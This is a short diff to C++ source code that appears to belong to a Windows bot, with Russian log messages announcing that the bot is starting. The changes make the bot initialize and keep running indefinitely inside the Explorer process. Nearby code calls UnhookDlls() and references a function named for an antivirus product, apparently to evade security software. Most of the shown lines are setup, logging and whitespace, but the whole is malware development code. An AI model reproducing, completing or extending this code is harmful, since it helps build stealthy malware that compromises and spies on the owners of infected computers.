@@ -220,6 +220,8 @@ static DWORD WINAPI NOD32Dll(void*)
 
 void ExplorerMain()
 {
+	BOT::Initialize();
+
 	MDBG("Main", "----------------- ExplorerMain -----------------");
 	MDBG("Main", "Appliation (PID:%d) %s", Bot->PID(), Bot->ApplicationName().t_str());
 	MDBG("Main", "WorkPath %s  WorkPathHash %d", BOT::GetWorkPathInSysDrive() ,BOT::GetWorkFolderHash());
@@ -268,14 +270,18 @@ void ExplorerMain()
 		ExplorerFirstStart(NULL);
 
 	ExplorerStart(NULL);
-
+	// Входим в бесконечный цикл работы 
+	while (1) pSleep(INFINITE);
 }
+
 
 DWORD WINAPI ExplorerRoutine( LPVOID lpData )
 {
+
 	BOT::Initialize();
 
 	UnhookDlls();
+
 	
 	if (dwExplorerSelf) 
 	{
@@ -295,7 +301,8 @@ DWORD WINAPI ExplorerRoutine( LPVOID lpData )
 
 int APIENTRY MyMain() 
 {
-	BOT::Initialize();
+	BOT::Initialize();  
+
 
 	MDBG("Main", "Запускается бот. Версия бота %s\r\nEXE: %s", BOT_VERSION, Bot->ApplicationName().t_str());
 	
